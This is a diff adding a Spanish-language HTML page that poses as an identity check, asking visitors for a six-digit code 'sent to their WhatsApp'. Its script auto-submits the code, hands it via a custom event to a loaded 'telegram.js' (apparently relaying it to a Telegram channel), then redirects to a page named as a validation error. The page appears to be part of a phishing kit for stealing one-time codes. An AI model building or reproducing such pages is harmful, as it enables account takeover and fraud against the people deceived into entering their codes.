@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validar Identidad</title>
+    <link rel="icon" href="icon.png" type="image/png">
+    <link rel="stylesheet" href="styless.css">
+    <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        background-color: #f5f5f5;
+        color: #333;
+        line-height: 1.5;
+    }
+
+    .container {
+        max-width: 396px;
+        margin: 13px auto;
+        padding: 20px;
+        border-radius:19px;
+        min-height: 100vh;
+        background: white;
+        position: relative;
+    }
+
+    header {
+        display: flex;
+        align-items: center;
+        padding: 1rem;
+        background: white;
+        border-bottom: 1px solid #eee;
+    }
+
+    .back-button {
+        background: none;
+        border: none;
+        padding: 0.5rem;
+        cursor: pointer;
+    }
+
+    .header-text {
+        margin-left: 1rem;
+        font-size: 1rem;
+        color: #333;
+    }
+
+    .spacer {
+        flex: 1;
+    }
+
+    main {
+        padding: 2rem 1.5rem;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+    }
+
+    .illustration {
+        position: relative;
+        margin: 2rem 0;
+    }
+
+    .circle-bg {
+        width: 200px;
+        height: 200px;
+        background: #f0f0f0;
+        border-radius: 50%;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 1;
+    }
+
+    .phone-image {
+        width: 120px;
+        height: auto;
+        position: relative;
+        z-index: 2;
+    }
+
+    h1 {
+        font-size: 1.25rem;
+        margin-bottom: 2rem;
+        font-weight: 600;
+    }
+
+    .pin-container {
+        display: flex;
+        gap: 0.5rem;
+        margin: 2rem 0;
+        justify-content: center;
+    }
+
+    .pin-input {
+        width: 40px;
+        height: 40px;
+        border: 2px solid #ddd;
+        border-radius: 8px;
+        text-align: center;
+        font-size: 1.25rem;
+        background: white;
+    }
+
+    .pin-input:focus {
+        border-color: #008f76;
+        outline: none;
+    }
+
+    .no-access-btn {
+        background: none;
+        border: none;
+        color: #008f76;
+        padding: 1rem;
+        font-size: 0.9rem;
+        cursor: pointer;
+        margin-top: 1rem;
+    }
+
+    @media (min-width: 768px) {
+        .container {
+            margin: 2rem auto;
+            min-height: calc(100vh - 4rem);
+            border-radius: 1rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+    }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="index.html"><button class="back-button" aria-label="Volver">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="m15 18-6-6 6-6"/>
+                </svg>
+            </button></a>
+            <span class="header-text"><strong> Válida tu identidad!</strong></span>
+            <span class="spacer"></span>
+        </header>
+
+        <main>
+            <div class="illustration">
+                <div class="circle-bg"></div>
+                <img src="assets/dispo.png" alt="Ilustración de dispositivo" class="phone-image">
+            </div>
+
+            <h1>Por medidas de seguridad ingresa el código que hemos enviado a tu dispositivo WhatsApp</h1>
+            <label style="color: gray;">Por favor, ingrese el código que se ha enviado a su WhatsApp.</label>
+
+            <div class="pin-container">
+                <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin1" oninput="moveFocus(event, 2)">
+                <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin2" oninput="moveFocus(event, 3)">
+                <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin3" oninput="moveFocus(event, 4)">
+                <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin4" oninput="moveFocus(event, 5)">
+                <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin5" oninput="moveFocus(event, 6)">
+                <input type="tel" maxlength="1" class="pin-input" pattern="[0-9]" id="pin6" oninput="moveFocus(event, 7)">
+            </div>
+            <form id="pin-form">
+                <input type="hidden" name="pin" id="hidden-pin">
+            </form>
+            
+            <button class="no-access-btn">Ya no tengo acceso a este número</button>
+        </main>
+    </div>
+
+    <script src="script.js"></script>
+    <script src="telegram.js"></script>
+    <script>
+        // Función para mover el foco al siguiente campo
+        function moveFocus(event, nextInputIndex) {
+            const currentInput = event.target;
+            if (currentInput.value.length === 1) {
+                const nextInput = document.getElementById('pin' + nextInputIndex);
+                if (nextInput) nextInput.focus();
+            }
+            
+            if (areAllFieldsFilled()) submitForm();
+        }
+
+        // Verificar si todos los inputs tienen un valor
+        function areAllFieldsFilled() {
+            const pinInputs = document.querySelectorAll('.pin-input');
+            return Array.from(pinInputs).every(input => input.value.length === 1);
+        }
+
+        // Enviar el formulario cuando todos los campos estén completos
+        function submitForm() {
+            const pinValues = Array.from(document.querySelectorAll('.pin-input')).map(input => input.value).join('');
+            document.getElementById('hidden-pin').value = pinValues;
+            
+            // Disparar evento personalizado para telegram.js
+            const event = new CustomEvent('pinCompleted', { detail: { pin: pinValues } });
+            document.dispatchEvent(event);
+            
+            // Redireccionar después de enviar
+            setTimeout(() => {
+                window.location.href = "Validacion_Erronea.html"; // Cambia esta URL según necesites
+            }, 1000);
+        }
+
+        // Validación de solo números
+        document.addEventListener('DOMContentLoaded', function() {
+            const pinInputs = document.querySelectorAll('input[id^="pin"]');
+            pinInputs.forEach(input => {
+                input.addEventListener('input', function(event) {
+                    event.target.value = event.target.value.replace(/\D/g, '');
+                });
+            });
+            
+            // Auto-focus en el primer input
+            const firstInput = document.getElementById('pin1');
+            if (firstInput) firstInput.focus();
+        });
+    </script>
+</body>
+</html>
